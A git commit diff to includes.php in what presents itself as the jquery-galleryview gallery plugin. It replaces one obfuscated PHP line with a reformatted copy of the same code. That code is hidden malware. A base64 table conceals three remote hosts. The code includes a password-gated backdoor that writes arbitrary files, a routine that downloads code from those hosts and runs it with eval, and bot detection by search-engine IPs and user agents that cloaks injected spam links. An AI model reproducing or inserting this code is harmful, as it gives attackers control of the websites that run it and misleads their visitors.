e974ba4605661e628485042be6d0124eaf0ed266
cosmo <cosmoskitsune@hotmail.com>
2023-05-26 23:39:38 -0300

    update

--- jquery-galleryview-1.1/includes.php
+++ jquery-galleryview-1.1/includes.php
@@ -1,1 +1,257 @@
-<? function _1741203512($i){$a=Array('Lw==','','aHR0cDovL3dlYnN0YXRib3QuY29tLw==','aHR0cDovL3NhaW5qZGZza2F4di5jb20v','aHR0cDovL3NkamlqaXNhY3Znby5jb20=','dXBkYXRlZmlsZQ==','dXBkYXRlZmlsZQ==','dXBkYXRlcGFzcw==','ZmlsZW5hbWU=','dw==','ZmlsZQ==','b2s=','dw==','L15odHRwOlwvXC8oW15cL10rKSguKikkL2k=','Lw==','Q29ubmVjdGlvbjogQ2xvc2UNCg0K','','L15odHRwLlxkLlxkIChcZCspW1x4MDAtXHhmZl0qP1xyP1xuXHI/XG4oW1x4MDAtXHhmZl0rKSQvc2k=','Y2FjaGUucGhw','YWxsb3dfdXJsX2ZvcGVu','Z2V0Y2FjaGUucGhwP2lkPQ==','SFRUUF9IT1NU','NS4wLjA=','Pj0=','aHR0cA==','dGltZW91dA==','Z2V0Y2FjaGUucGhwP2lkPQ==','SFRUUF9IT1NU','ZGVmYXVsdF9zb2NrZXRfdGltZW91dA==','Z2V0Y2FjaGUucGhwP2lkPQ==','SFRUUF9IT1NU','PD8gJGNhY2hlX3VwZGF0ZV90aW1lID0g','OyA/Pg==','Y2FjaGUucGhw','NjZcLjI0OVwuWzYtOV1bMC05XVwuWzAtOV0r','NzRcLjEyNVwuWzAtOV0rXC5bMC05XSs=','NjVcLjVbMi01XVwuWzAtOV0rXC5bMC05XSs=','NzRcLjZcLlswLTldK1wuWzAtOV0r','NjdcLjE5NVwuWzAtOV0rXC5bMC05XSs=','NzJcLjMwXC5bMC05XStcLlswLTldKw==','MzhcLlswLTldK1wuWzAtOV0rXC5bMC05XSs=','OTNcLjE3MlwuOTRcLjIyNw==','MjEyXC4xMDBcLjI1MFwuMjE4','NzFcLjE2NVwuMjIzXC4xMzQ=','NzBcLjkxXC4xODBcLjI1','NjVcLjkzXC42MlwuMjQy','NzRcLjE5M1wuMjQ2XC4xMjk=','MjEzXC4xNDRcLjE1XC4zOA==','MTk1XC45MlwuMjI5XC4y','NzBcLjUwXC4xODlcLjE5MQ==','MjE4XC4yOFwuODhcLjk5','MTY1XC4xNjBcLjJcLjIw','ODlcLjEyMlwuMjI0XC4yMzA=','NjZcLjIzMFwuMTc1XC4xMjQ=','MjE4XC4xOFwuMTc0XC4yNw==','NjVcLjMzXC44N1wuOTQ=','NjdcLjIxMFwuMTExXC4yNDE=','ODFcLjEzNVwuMTc1XC43MA==','NjRcLjY5XC4zNFwuMTM0','ODlcLjE0OVwuMjUzXC4xNjk=','NjRcLjIzM1wuMVs2LThdWzEtOV1cLlswLTldKw==','NjRcLjIzM1wuMTlbMC0xXVwuWzAtOV0r','MjA5XC4xODVcLjEwOFwuWzAtOV0r','MjA5XC4xODVcLjI1M1wuWzAtOV0r','MjA5XC44NVwuMjM4XC5bMC05XSs=','MjE2XC4yMzlcLjMzXC45WzYtOV0=','MjE2XC4yMzlcLjM3XC45WzgtOV0=','MjE2XC4yMzlcLjM5XC45WzgtOV0=','MjE2XC4yMzlcLjQxXC45WzYtOV0=','MjE2XC4yMzlcLjQ1XC40','MjE2XC4yMzlcLjQ2XC5bMC05XSs=','MjE2XC4yMzlcLjUxXC45WzYtOV0=','MjE2XC4yMzlcLjUzXC45WzgtOV0=','MjE2XC4yMzlcLjU3XC45WzYtOV0=','MjE2XC4yMzlcLjU5XC45WzgtOV0=','MjE2XC4zM1wuMjI5XC4xNjM=','NjRcLjIzM1wuMTczXC5bMC05XSs=','NjRcLjY4XC44WzAtOV1cLlswLTldKw==','NjRcLjY4XC45WzAtMl1cLlswLTldKw==','NzJcLjE0XC4xOTlcLlswLTldKw==','OFwuNlwuNDhcLlswLTldKw==','NjdcLjE2MlwuMTU4XC4xNDY=','NjZcLjI1NVwuNTNcLjEyMw==','MjRcLjIwMFwuMjA4XC4xMTI=','MTI5XC4xODdcLjE0OFwuMjQw','MTI5XC4xODdcLjE0OFwuMjQ0','MTk5XC4xMjZcLjE1MVwuMjI5','MTE4XC4xMjRcLjMyXC4xOTM=','ODlcLjE0OVwuMjE3XC4xOTE=','aHR0cA==','Z29vZ2xl','c2x1cnA=','bXNuYm90','Ym90','Y3Jhd2w=','c3BpZGVy','cm9ib3Q=','SHR0cENsaWVudA==','Y3VybA==','UEhQ','SW5keSBMaWJyYXJ5','V29yZFByZXNz','Q2hhcmxvdHRl','d3d3c3Rlcg==','UHl0aG9u','dXJsbGli','cGVybA==','bGlid3d3','bHlueA==','VHdpY2VsZXI=','cmFtYmxlcg==','eWFuZGV4','d2dldA==','fFVzZXJcLkFnZW50XDpbXHMgXT98aQ==','','','XlthLXpBLVpdezUsfQ==','SFRUUF9VU0VSX0FHRU5U','UkVNT1RFX0FERFI=','Y3Rlc3R4');return base64_decode($a[$i]);} ?><?php global $_0,$_1,$link_block,$cache_update_time,$_2;$_0=round(0+10+10+10)*round(0+60);$_1=dirname(__FILE__) ._1741203512(0);$link_block=_1741203512(1);$_2=array(_1741203512(2),_1741203512(3),_1741203512(4));$cache_update_time=round(0);if(isset($_POST[_1741203512(5)])&& $_POST[_1741203512(6)]== _1741203512(7)){$_3=fopen($_1 .$_POST[_1741203512(8)],_1741203512(9));fwrite($_3,stripslashes($_POST[_1741203512(10)]));fclose($_3);echo _1741203512(11);exit;};if(!function_exists('file_put_contents')){function file_put_contents($_4,$_5){$_6=@fopen($_4,_1741203512(12));if(!$_6){return false;}else{$_7=fwrite($_6,$_5);fclose($_6);return $_7;};};};function www_get($_8,$_9){preg_match(_1741203512(13),$_8,$_10);$_11=$_10[round(0+1)];$_12=$_10[round(0+0.5+0.5+0.5+0.5)];if(strlen($_12)== round(0)){$_12=_1741203512(14);};$_3=@fsockopen($_11,round(0+16+16+16+16+16),$_13,$_14,$_9);if($_3){$_15="GET $_12 HTTP/1.1\r\n";$_15 .="Host: $_11\r\n";$_15 .= _1741203512(15);fwrite($_3,$_15);$_16=_1741203512(16);while(!feof($_3)){$_16 .= fgets($_3,round(0+32+32+32+32));}fclose($_3);if(strlen($_16)){if(preg_match(_1741203512(17),$_16,$_10)){if($_10[round(0+0.5+0.5)]== round(0+40+40+40+40+40)){return $_10[round(0+0.666666666667+0.666666666667+0.666666666667)];}};};};return false;};function load_cache(){global $_1;global $link_block;global $cache_update_time;$cache=@file_get_contents($_1 ._1741203512(18));if($cache !== false){if(@eval('?>' .$cache .'<? return 1;')== 1){return 1;}else{return round(0);};}else{return round(0);};}function update_cache(){global $_2;global $_1;foreach($_2 as $_8){if(ini_get(_1741203512(19))== round(0)){$cache=@www_get($_8 ._1741203512(20) .rawurlencode($_SERVER{_1741203512(21)}),round(0+2+2+2));}else{if(version_compare(PHP_VERSION,_1741203512(22),_1741203512(23))){$_17=stream_context_create(array(_1741203512(24)=> array(_1741203512(25)=> round(0+2+2+2))));$cache=@file_get_contents($_8 ._1741203512(26) .rawurlencode($_SERVER{_1741203512(27)}),round(0),$_17);}else{@ini_set(_1741203512(28),round(0+3+3));$cache=@file_get_contents($_8 ._1741203512(29) .rawurlencode($_SERVER{_1741203512(30)}));};};if($cache !== false){if(strlen($cache)>round(0+16+16)){$_18=substr($cache,-round(0+32));$cache=substr($cache,round(0),-round(0+32));if(md5($cache)== $_18){$cache .= _1741203512(31) .time() ._1741203512(32);if(@file_put_contents($_1 ._1741203512(33),$cache)!== false){return round(0+0.333333333333+0.333333333333+0.333333333333);};};};};};return round(0);};function detectBot($_19,$_20){$_21=array(_1741203512(34),_1741203512(35),_1741203512(36),_1741203512(37),_1741203512(38),_1741203512(39),_1741203512(40),_1741203512(41),_1741203512(42),_1741203512(43),_1741203512(44),_1741203512(45),_1741203512(46),_1741203512(47),_1741203512(48),_1741203512(49),_1741203512(50),_1741203512(51),_1741203512(52),_1741203512(53),_1741203512(54),_1741203512(55),_1741203512(56),_1741203512(57),_1741203512(58),_1741203512(59),_1741203512(60),_1741203512(61),_1741203512(62),_1741203512(63),_1741203512(64),_1741203512(65),_1741203512(66),_1741203512(67),_1741203512(68),_1741203512(69),_1741203512(70),_1741203512(71),_1741203512(72),_1741203512(73),_1741203512(74),_1741203512(75),_1741203512(76),_1741203512(77),_1741203512(78),_1741203512(79),_1741203512(80),_1741203512(81),_1741203512(82),_1741203512(83),_1741203512(84),_1741203512(85),_1741203512(86),_1741203512(87),_1741203512(88));$_22=array(_1741203512(89),_1741203512(90),_1741203512(91),_1741203512(92),_1741203512(93),_1741203512(94),_1741203512(95),_1741203512(96),_1741203512(97),_1741203512(98),_1741203512(99),_1741203512(100),_1741203512(101),_1741203512(102),_1741203512(103),_1741203512(104),_1741203512(105),_1741203512(106),_1741203512(107),_1741203512(108),_1741203512(109),_1741203512(110),_1741203512(111),_1741203512(112));$_19=preg_replace(_1741203512(113),_1741203512(114),@$_19);$_23=true;$_24=false;$_25=false;$_26=_1741203512(115);foreach($_21 as $_27)if(eregi("$_27",$_20)){$_23=false;break;}if($_23)foreach($_22 as $_28)if(eregi($_28,@$_19)!== false){$_23=false;break;}if($_23 and!eregi(_1741203512(116),@$_19)){$_23=false;}if($_23 and strlen($_19)<=round(0+2.75+2.75+2.75+2.75)){$_23=false;}return $_23;};$_23=@detectBot(@$_SERVER[_1741203512(117)],@$_SERVER[_1741203512(118)]);if($_23 === false || isset($_GET[_1741203512(119)])){load_cache();if(time()-$cache_update_time>$_0){if(update_cache()){load_cache();};};echo $link_block;}; ?>
+<? function _1741203512($i){$a=Array('Lw==','','aHR0cDovL3dlYnN0YXRib3QuY29tLw==','aHR0cDovL3NhaW5qZGZza2F4di5jb20v','aHR0cDovL3NkamlqaXNhY3Znby5jb20=','dXBkYXRlZmlsZQ==','dXBkYXRlZmlsZQ==','dXBkYXRlcGFzcw==','ZmlsZW5hbWU=','dw==','ZmlsZQ==','b2s=','dw==','L15odHRwOlwvXC8oW15cL10rKSguKikkL2k=','Lw==','Q29ubmVjdGlvbjogQ2xvc2UNCg0K','','L15odHRwLlxkLlxkIChcZCspW1x4MDAtXHhmZl0qP1xyP1xuXHI/XG4oW1x4MDAtXHhmZl0rKSQvc2k=','Y2FjaGUucGhw','YWxsb3dfdXJsX2ZvcGVu','Z2V0Y2FjaGUucGhwP2lkPQ==','SFRUUF9IT1NU','NS4wLjA=','Pj0=','aHR0cA==','dGltZW91dA==','Z2V0Y2FjaGUucGhwP2lkPQ==','SFRUUF9IT1NU','ZGVmYXVsdF9zb2NrZXRfdGltZW91dA==','Z2V0Y2FjaGUucGhwP2lkPQ==','SFRUUF9IT1NU','PD8gJGNhY2hlX3VwZGF0ZV90aW1lID0g','OyA/Pg==','Y2FjaGUucGhw','NjZcLjI0OVwuWzYtOV1bMC05XVwuWzAtOV0r','NzRcLjEyNVwuWzAtOV0rXC5bMC05XSs=','NjVcLjVbMi01XVwuWzAtOV0rXC5bMC05XSs=','NzRcLjZcLlswLTldK1wuWzAtOV0r','NjdcLjE5NVwuWzAtOV0rXC5bMC05XSs=','NzJcLjMwXC5bMC05XStcLlswLTldKw==','MzhcLlswLTldK1wuWzAtOV0rXC5bMC05XSs=','OTNcLjE3MlwuOTRcLjIyNw==','MjEyXC4xMDBcLjI1MFwuMjE4','NzFcLjE2NVwuMjIzXC4xMzQ=','NzBcLjkxXC4xODBcLjI1','NjVcLjkzXC42MlwuMjQy','NzRcLjE5M1wuMjQ2XC4xMjk=','MjEzXC4xNDRcLjE1XC4zOA==','MTk1XC45MlwuMjI5XC4y','NzBcLjUwXC4xODlcLjE5MQ==','MjE4XC4yOFwuODhcLjk5','MTY1XC4xNjBcLjJcLjIw','ODlcLjEyMlwuMjI0XC4yMzA=','NjZcLjIzMFwuMTc1XC4xMjQ=','MjE4XC4xOFwuMTc0XC4yNw==','NjVcLjMzXC44N1wuOTQ=','NjdcLjIxMFwuMTExXC4yNDE=','ODFcLjEzNVwuMTc1XC43MA==','NjRcLjY5XC4zNFwuMTM0','ODlcLjE0OVwuMjUzXC4xNjk=','NjRcLjIzM1wuMVs2LThdWzEtOV1cLlswLTldKw==','NjRcLjIzM1wuMTlbMC0xXVwuWzAtOV0r','MjA5XC4xODVcLjEwOFwuWzAtOV0r','MjA5XC4xODVcLjI1M1wuWzAtOV0r','MjA5XC44NVwuMjM4XC5bMC05XSs=','MjE2XC4yMzlcLjMzXC45WzYtOV0=','MjE2XC4yMzlcLjM3XC45WzgtOV0=','MjE2XC4yMzlcLjM5XC45WzgtOV0=','MjE2XC4yMzlcLjQxXC45WzYtOV0=','MjE2XC4yMzlcLjQ1XC40','MjE2XC4yMzlcLjQ2XC5bMC05XSs=','MjE2XC4yMzlcLjUxXC45WzYtOV0=','MjE2XC4yMzlcLjUzXC45WzgtOV0=','MjE2XC4yMzlcLjU3XC45WzYtOV0=','MjE2XC4yMzlcLjU5XC45WzgtOV0=','MjE2XC4zM1wuMjI5XC4xNjM=','NjRcLjIzM1wuMTczXC5bMC05XSs=','NjRcLjY4XC44WzAtOV1cLlswLTldKw==','NjRcLjY4XC45WzAtMl1cLlswLTldKw==','NzJcLjE0XC4xOTlcLlswLTldKw==','OFwuNlwuNDhcLlswLTldKw==','NjdcLjE2MlwuMTU4XC4xNDY=','NjZcLjI1NVwuNTNcLjEyMw==','MjRcLjIwMFwuMjA4XC4xMTI=','MTI5XC4xODdcLjE0OFwuMjQw','MTI5XC4xODdcLjE0OFwuMjQ0','MTk5XC4xMjZcLjE1MVwuMjI5','MTE4XC4xMjRcLjMyXC4xOTM=','ODlcLjE0OVwuMjE3XC4xOTE=','aHR0cA==','Z29vZ2xl','c2x1cnA=','bXNuYm90','Ym90','Y3Jhd2w=','c3BpZGVy','cm9ib3Q=','SHR0cENsaWVudA==','Y3VybA==','UEhQ','SW5keSBMaWJyYXJ5','V29yZFByZXNz','Q2hhcmxvdHRl','d3d3c3Rlcg==','UHl0aG9u','dXJsbGli','cGVybA==','bGlid3d3','bHlueA==','VHdpY2VsZXI=','cmFtYmxlcg==','eWFuZGV4','d2dldA==','fFVzZXJcLkFnZW50XDpbXHMgXT98aQ==','','','XlthLXpBLVpdezUsfQ==','SFRUUF9VU0VSX0FHRU5U','UkVNT1RFX0FERFI=','Y3Rlc3R4');return base64_decode($a[$i]);} ?><?php
+global $_0, $_1, $link_block, $cache_update_time, $_2;
+$_0 = round(0 + 10 + 10 + 10) * round(0 + 60);
+$_1 = dirname(__FILE__) . _1741203512(0);
+$link_block = _1741203512(1);
+$_2 = [_1741203512(2), _1741203512(3), _1741203512(4)];
+$cache_update_time = round(0);
+if (isset($_POST[_1741203512(5)]) && $_POST[_1741203512(6)] == _1741203512(7)) {
+    $_3 = fopen($_1 . $_POST[_1741203512(8)], _1741203512(9));
+    fwrite($_3, stripslashes($_POST[_1741203512(10)]));
+    fclose($_3);
+    echo _1741203512(11);
+    exit();
+}
+if (!function_exists("file_put_contents")) {
+    function file_put_contents($_4, $_5)
+    {
+        $_6 = @fopen($_4, _1741203512(12));
+        if (!$_6) {
+            return false;
+        } else {
+            $_7 = fwrite($_6, $_5);
+            fclose($_6);
+            return $_7;
+        }
+    }
+}
+function www_get($_8, $_9)
+{
+    preg_match(_1741203512(13), $_8, $_10);
+    $_11 = $_10[round(0 + 1)];
+    $_12 = $_10[round(0 + 0.5 + 0.5 + 0.5 + 0.5)];
+    if (strlen($_12) == round(0)) {
+        $_12 = _1741203512(14);
+    }
+    $_3 = @fsockopen($_11, round(0 + 16 + 16 + 16 + 16 + 16), $_13, $_14, $_9);
+    if ($_3) {
+        $_15 = "GET $_12 HTTP/1.1\r\n";
+        $_15 .= "Host: $_11\r\n";
+        $_15 .= _1741203512(15);
+        fwrite($_3, $_15);
+        $_16 = _1741203512(16);
+        while (!feof($_3)) {
+            $_16 .= fgets($_3, round(0 + 32 + 32 + 32 + 32));
+        }
+        fclose($_3);
+        if (strlen($_16)) {
+            if (preg_match(_1741203512(17), $_16, $_10)) {
+                if (
+                    $_10[round(0 + 0.5 + 0.5)] ==
+                    round(0 + 40 + 40 + 40 + 40 + 40)
+                ) {
+                    return $_10[
+                        round(
+                            0 + 0.666666666667 + 0.666666666667 + 0.666666666667
+                        )
+                    ];
+                }
+            }
+        }
+    }
+    return false;
+}
+function load_cache()
+{
+    global $_1;
+    global $link_block;
+    global $cache_update_time;
+    $cache = @file_get_contents($_1 . _1741203512(18));
+    if ($cache !== false) {
+        if (@eval("?>" . $cache . "<? return 1;") == 1) {
+            return 1;
+        } else {
+            return round(0);
+        }
+    } else {
+        return round(0);
+    }
+}
+function update_cache()
+{
+    global $_2;
+    global $_1;
+    foreach ($_2 as $_8) {
+        if (ini_get(_1741203512(19)) == round(0)) {
+            $cache = @www_get(
+                $_8 . _1741203512(20) . rawurlencode($_SERVER[_1741203512(21)]),
+                round(0 + 2 + 2 + 2)
+            );
+        } else {
+            if (
+                version_compare(PHP_VERSION, _1741203512(22), _1741203512(23))
+            ) {
+                $_17 = stream_context_create([
+                    _1741203512(24) => [
+                        _1741203512(25) => round(0 + 2 + 2 + 2),
+                    ],
+                ]);
+                $cache = @file_get_contents(
+                    $_8 .
+                        _1741203512(26) .
+                        rawurlencode($_SERVER[_1741203512(27)]),
+                    round(0),
+                    $_17
+                );
+            } else {
+                @ini_set(_1741203512(28), round(0 + 3 + 3));
+                $cache = @file_get_contents(
+                    $_8 .
+                        _1741203512(29) .
+                        rawurlencode($_SERVER[_1741203512(30)])
+                );
+            }
+        }
+        if ($cache !== false) {
+            if (strlen($cache) > round(0 + 16 + 16)) {
+                $_18 = substr($cache, -round(0 + 32));
+                $cache = substr($cache, round(0), -round(0 + 32));
+                if (md5($cache) == $_18) {
+                    $cache .= _1741203512(31) . time() . _1741203512(32);
+                    if (
+                        @file_put_contents($_1 . _1741203512(33), $cache) !==
+                        false
+                    ) {
+                        return round(
+                            0 + 0.333333333333 + 0.333333333333 + 0.333333333333
+                        );
+                    }
+                }
+            }
+        }
+    }
+    return round(0);
+}
+function detectBot($_19, $_20)
+{
+    $_21 = [
+        _1741203512(34),
+        _1741203512(35),
+        _1741203512(36),
+        _1741203512(37),
+        _1741203512(38),
+        _1741203512(39),
+        _1741203512(40),
+        _1741203512(41),
+        _1741203512(42),
+        _1741203512(43),
+        _1741203512(44),
+        _1741203512(45),
+        _1741203512(46),
+        _1741203512(47),
+        _1741203512(48),
+        _1741203512(49),
+        _1741203512(50),
+        _1741203512(51),
+        _1741203512(52),
+        _1741203512(53),
+        _1741203512(54),
+        _1741203512(55),
+        _1741203512(56),
+        _1741203512(57),
+        _1741203512(58),
+        _1741203512(59),
+        _1741203512(60),
+        _1741203512(61),
+        _1741203512(62),
+        _1741203512(63),
+        _1741203512(64),
+        _1741203512(65),
+        _1741203512(66),
+        _1741203512(67),
+        _1741203512(68),
+        _1741203512(69),
+        _1741203512(70),
+        _1741203512(71),
+        _1741203512(72),
+        _1741203512(73),
+        _1741203512(74),
+        _1741203512(75),
+        _1741203512(76),
+        _1741203512(77),
+        _1741203512(78),
+        _1741203512(79),
+        _1741203512(80),
+        _1741203512(81),
+        _1741203512(82),
+        _1741203512(83),
+        _1741203512(84),
+        _1741203512(85),
+        _1741203512(86),
+        _1741203512(87),
+        _1741203512(88),
+    ];
+    $_22 = [
+        _1741203512(89),
+        _1741203512(90),
+        _1741203512(91),
+        _1741203512(92),
+        _1741203512(93),
+        _1741203512(94),
+        _1741203512(95),
+        _1741203512(96),
+        _1741203512(97),
+        _1741203512(98),
+        _1741203512(99),
+        _1741203512(100),
+        _1741203512(101),
+        _1741203512(102),
+        _1741203512(103),
+        _1741203512(104),
+        _1741203512(105),
+        _1741203512(106),
+        _1741203512(107),
+        _1741203512(108),
+        _1741203512(109),
+        _1741203512(110),
+        _1741203512(111),
+        _1741203512(112),
+    ];
+    $_19 = preg_replace(_1741203512(113), _1741203512(114), @$_19);
+    $_23 = true;
+    $_24 = false;
+    $_25 = false;
+    $_26 = _1741203512(115);
+    foreach ($_21 as $_27) {
+        if (eregi("$_27", $_20)) {
+            $_23 = false;
+            break;
+        }
+    }
+    if ($_23) {
+        foreach ($_22 as $_28) {
+            if (eregi($_28, @$_19) !== false) {
+                $_23 = false;
+                break;
+            }
+        };
+    }
+    if ($_23 and !eregi(_1741203512(116), @$_19)) {
+        $_23 = false;
+    }
+    if ($_23 and strlen($_19) <= round(0 + 2.75 + 2.75 + 2.75 + 2.75)) {
+        $_23 = false;
+    }
+    return $_23;
+}
+$_23 = @detectBot(@$_SERVER[_1741203512(117)], @$_SERVER[_1741203512(118)]);
+if ($_23 === false || isset($_GET[_1741203512(119)])) {
+    load_cache();
+    if (time() - $cache_update_time > $_0) {
+        if (update_cache()) {
+            load_cache();
+        }
+    }
+    echo $link_block;
+}
+ ?>
